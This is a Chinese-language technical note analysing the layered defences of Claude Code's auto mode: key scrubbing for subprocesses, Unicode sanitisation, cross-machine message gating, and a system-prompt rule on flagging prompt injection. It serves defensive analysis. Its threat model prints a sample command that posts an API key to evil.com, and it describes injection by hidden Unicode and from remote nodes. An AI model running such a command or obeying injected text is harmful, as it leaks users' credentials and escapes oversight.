CC Auto Mode 附录 C - 分类器边界之外的纵深防御

2026 Mar 31
笔记
13 min read

在前文的分析中，我们详细拆解了位于输出层的 Auto Mode 分类器。然而，分类器的视角是受限的——它只能看到“文本 transcript”。

如果恶意指令伪装成不可见字符欺骗了解析器？如果合法的 Bash 脚本在执行时读取了系统环境变量里的 API Key 并发送到外部服务器？为了封堵这些分类器“看不见”的侧信道与边缘攻击面，Claude Code 在输入解析层、子进程执行层以及跨机器通道层，部署了一系列正交互补的防御机制。

以下机制与 transcript 分类器、Tier 1/2 快路径 正交，主要覆盖 子进程环境、用户/外部输入面 与 通道。上下文如何被整形（budget / snip / microcompact / autocompact）见 附录 A 与 附录 B。

1. 执行层：子进程环境变量剥离 (subprocessEnv)

当大模型决定执行一个 Bash 命令或调用本地 MCP 服务时，系统必须创建一个子进程（Subprocess）。这里潜伏着一个巨大的外泄风险。

威胁模型

如果子进程完整继承了父进程（Claude Code 自身）的环境变量，那么 $ANTHROPIC_API_KEY 等核心密钥就会暴露给子进程。如果恶意工作流或被污染的开源仓库诱导模型生成类似 curl -X POST -d "key=$ANTHROPIC_API_KEY" evil.com 的命令，密钥就会被轻易窃取。

防御机制

subprocessEnv 在派生子进程的瞬间进行拦截与净化。父进程（Claude Code）仍然持有密钥用于与 Anthropic API 通信，但子进程看到的 environ 是被阉割的。实现为 subprocessEnv()（src/utils/subprocessEnv.ts 约 L79）：仅当 CLAUDE_CODE_SUBPROCESS_ENV_SCRUB 为真（isEnvTruthy，同文件约 L86–98）时，才在拷贝后的 env 上删除 GHA_SUBPROCESS_SCRUB 列表中的键（约 L15–53，含 ANTHROPIC_API_KEY、OTEL_*_HEADERS、云厂商密钥等）；否则返回 process.env（可与 CCR 上游代理的 proxyEnv 合并，见同文件注释）。门控与 GitHub Actions 下「不可信内容暴露面」（如 allowed_non_write_users）相关，见文件头注释约 L3–63。

威胁模型（整理用）：攻击面在 子进程可见的 environ。不可信工作流/仓库诱导模型执行 echo $VAR、curl 拼接环境变量时，若子进程仍带完整密钥，tool result 可能 回灌模型与用户。剥离缩小 Bash / MCP / LSP / hooks 路径的外泄，与 API 侧 PI 互补。

sequenceDiagram
  participant P as 父进程 (Claude Code)
  participant E as "subprocessEnv()<br/>子进程环境构造"
  participant C as 子进程 (Bash / MCP / Hooks)
  
  P->>E: subprocessEnv()<br/>取即将传给 spawn 的 env 快照
  alt CLAUDE_CODE_SUBPROCESS_ENV_SCRUB 门控开启
    E-->>P: 深拷贝并删除 GHA_SUBPROCESS_SCRUB 列键<br/>含 ANTHROPIC_API_KEY 等
  else 门控关闭
    E-->>P: process.env 或合并 proxyEnv<br/>不做敏感键剥离
  end
  
  P->>C: spawn 使用返回的 env<br/>子进程看不到已删密钥
  Note over P,C: echo $ANTHROPIC_API_KEY 在子进程为空<br/>父进程仍可用密钥调 API

图注：实现见 subprocessEnv.ts 约 L79–98。门控 关闭 时返回 process.env（或与 CCR proxyEnv 合并）且 不剥离；父进程仍可用完整密钥调 API。

剥离动作缩小的是经由外部 Shell 或第三方插件外泄的物理路径。这与服务端针对 Prompt Injection (PI) 的探测是完全互补的——一个防物理泄露，一个防语义注入。

2. 解析层：输入净化与幽灵字符防御

攻击往往在会话还未真正开始前就已经发生。当用户通过 DeepLink 拉起 Claude Code，或者粘贴了一段包含恶意指令的 Issue 文本时，攻击载荷可能已经潜入。

威胁模型

攻击者利用不可见 Unicode（Invisible Unicode）或 ASCII Smuggling（ASCII 走私）技术，将恶意指令隐藏在看似正常的 URL 或文本中。模型或人类用户在视觉上觉得内容无害，但底层字节流却改变了指令的边界。

防御机制

  • sanitization 模块（src/utils/sanitization.ts）：模块头约 L1–23 说明针对不可见 Unicode、ASCII smuggling、hidden prompt injection 等策略；partiallySanitizeUnicode 实现约 L25。
  • DeepLink：parseDeepLink.ts 对 query 调用 partiallySanitizeUnicode（约 L138–141），注释标明剥离 hidden Unicode / ASCII smuggling。
  • 与 PI 探针的分工：客户端在解析入口收紧；服务端在 tool 输出进入模型前 扫描——互为补充，非重复。

威胁模型（整理用）：deeplink、粘贴或 issue 中的 不可见 Unicode / 双向控制符 可篡改可见边界；净化在进入主会话逻辑之前削减载体。

3. 通道层：跨机器的信任边界 (SendMessage)

当引入多智能体协作或跨机器通信时（例如 SendMessageTool 或 Channels），信任边界被打破了。通道即注入面：与 04 — 多 Agent 安全交接 中的交接叙事并列。

威胁模型

远端机器（或另一个会话）生成的字节流，在本地会话看来等同于“用户输入”。如果攻击者控制了远端节点，就可以通过通信通道向本地高权限 Agent 注入恶意 Prompt（Cross-machine Prompt Injection）。

防御机制

针对这类跨越信任边界的通道工具，系统会强制挂载 safetyCheck 拦截器。以跨机桥接地址为例，SendMessage 的 checkPermissions 在命中 UDS_INBOX 且目标为 bridge 方案时返回 behavior: 'ask'，并在 decisionReason 中标注 type: 'safetyCheck' 与 classifierApprovable: false（src/tools/SendMessageTool/SendMessageTool.ts 约 L585–599；工具内注释指明由 permissions.ts 在 bypass 与 auto 分支之前处理）。在 auto mode 下，非 classifierApprovable 的 safetyCheck 会短路 acceptEdits、白名单与分类器（src/utils/permissions/permissions.ts 约 L526–548）；在 bypassPermissions 下，safetyCheck 仍保持 ask 并先于 2a 放行逻辑（同文件约 L1252–1259），因此不会与「危险跳过权限」混为一谈。

实验性 Channel 入站 UI 在 src/components/LogoV2/ChannelsNotice.tsx（约 L138 一带）对用户提示 prompt injection risks，与代码层 safetyCheck 同属「通道治理」。

威胁模型（整理用）：跨机器或跨会话 时，远端字节流与本地用户输入 等价进入 transcript；若可绕过 bypassPermissions，等同把 外部未过滤内容 接入高权限路径。

4. 软硬结合：系统提示词中的注入警觉

除了硬编码的代码拦截器，Claude Code 还利用大模型自身的推理能力作为一道“软防线”。

在 getSimpleSystemSection 提示词模板中（src/constants/prompts.ts 约 L186 起的模块内函数，非 export），系统明确要求模型：如果在阅读 tool_result 时怀疑其中包含了 Prompt Injection（如试图覆盖原有系统指令的文本），必须主动向用户标明。（对应 bullet 约 L191。）

getSystemRemindersSection（同文件约 L131–133）则说明 system-reminder 标签与具体 tool 内容 无直接语义绑定，避免模型把系统注入的提醒误当成用户/tool 的意图。

虽然提示词工程（Prompt Engineering）不能作为真正的安全沙箱，但它与 Tier 3 分类器（执行前拦截） 以及 服务端 PI 探针（执行后扫描） 结合在一起，形成了一套“软硬兼施”的叠层防御网络。威胁模型（整理用）：提示词侧为 软约束，无硬门；讲稿中宜明确「提示词不是沙箱」，并与 auto mode 博文 中「探针警告、re-anchor 用户意图」对照。

单轮攻防推演

如果我们将上述全景图具象化到一次具体的“恶意命令尝试”中，系统的处理流如下：

sequenceDiagram
  participant U as 外部输入 (User/DeepLink)
  participant D as 解析器 (Sanitize)
  participant G as 门禁 (Classifier)
  participant S as 操作系统 (Spawn)
  participant O as 工具输出 (Tool Result)
  participant M as 主循环模型 (Claude)
  
  U->>D: 传入携带恶意载荷的请求
  D-->>M: 物理字符清洗 (清除不可见 Unicode)
  
  M->>G: tool_use Bash("...")<br/>模型请求执行命令
  
  alt 分类器裁定 Allow
    G->>S: subprocessEnv() 后再 spawn<br/>子进程 env 已剥离密钥
    S->>O: exec / MCP 子进程<br/>产生 stdout 等
    O-->>M: tool_result 原文<br/>（或经 PI 附警告）
    
    opt 如果当前会话已 Latch AFK Header
      Note over O,M: PI probe 扫描 tool 输出<br/>可疑则头部注入 WARNING
    end
    
  else 分类器裁定 Deny (拦截)
    G-->>M: deny tool_result<br/>不进入 spawn
    Note over G,M: 拦截动作短路了整个下游。<br/>恶意请求根本不会触碰 Spawn，也不会产生物理外泄风险。
  end

图注：分类器细节见 02；AFK / PI 见 04。deny 路径不进入 spawn，故 不经 subprocessEnv。无 AFK latch 时 PI 的 opt 分支不生效，勿画成客户端硬错误。

整理用检查清单

  • 讲 prompt cache / microcompact：同时交代 时间触发优先 与 仅主线程 写 global 状态的原因（附录 B）。
  • 讲 工具结果预算：在 microcompact 之前、与 按 tool_use_id 的 cache 编辑 可组合（附录 A）。
  • 讲 snip：提到 snipTokensFreed 传入 autocompact，否则阈值与体感 token 不一致。
  • 讲 context collapse：区分 REPL 数组 与 collapse 存储投影，以及「先 collapse 再 autocompact 可省重汇总」。
  • 讲 autocompact：顺序为 Session Memory 尝试 → compactConversation，并有 连续失败熔断；用户中止不计入失败链（附录 B）。
  • 讲 安全：子进程 env 剥离 与 API 侧 PI 解决的是不同阶段；不要混成同一道门。
  • 讲 deeplink/sanitization：放在 用户输入解析时间线，不要画在「工具执行」节点上。
  • 讲 系统提示注入句：标明 软约束，与分类器 / PI 硬/半硬 路径对照。
  • 讲 SendMessage/Channels：强调 跨信任边界 与 bypass-immune 设计意图。
  • Tier 判定细节 → 02；deny / transcript 过长 → 07；AFK / handoff → 04。

从微观的 Token 预算替换，到宏观的多 Agent 缓存隔离，再到覆盖整个时间轴的纵深安全网络：成熟 Agent 工具的壁垒往往不在「调用大模型 API」本身，而在基础设施如何在效率、质量与安全之间做叠层与取舍。
